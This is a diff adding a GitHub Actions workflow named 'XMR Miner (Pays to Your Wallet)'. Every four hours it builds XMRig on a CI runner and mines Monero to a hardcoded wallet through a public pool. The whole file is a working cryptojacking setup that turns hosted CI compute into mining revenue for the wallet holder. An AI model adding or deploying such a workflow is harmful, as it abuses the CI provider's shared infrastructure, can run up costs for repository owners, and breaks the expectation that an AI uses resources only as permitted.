@@ -1,0 +1,31 @@
+name: XMR Miner (Pays to Your Wallet)
+
+on:
+  schedule:
+    - cron: '0 */4 * * *'
+  workflow_dispatch:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build and run XMRig
+        run: |
+          sudo apt update && sudo apt install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev git
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig && mkdir build && cd build
+          cmake .. && make -j$(nproc)
+          cat > config.json <<EOF
+          {
+              "autosave": true,
+              "cpu": {"enabled": true, "max-threads-hint": 70},
+              "pools": [{
+                  "url": "pool.supportxmr.com:3333",
+                  "user": "84EpcRqHykahepTF32qggV6mkAgED8TymjTX9647EiYkXfbv9oHmm89S1CFvhHV4haTfSJwQKGiuEgc4Az7voZQkBQUcM2t",
+                  "pass": "x",
+                  "tls": false,
+                  "keepalive": true
+              }]
+          }
+          EOF
+          ./xmrig --config=config.json --threads=2
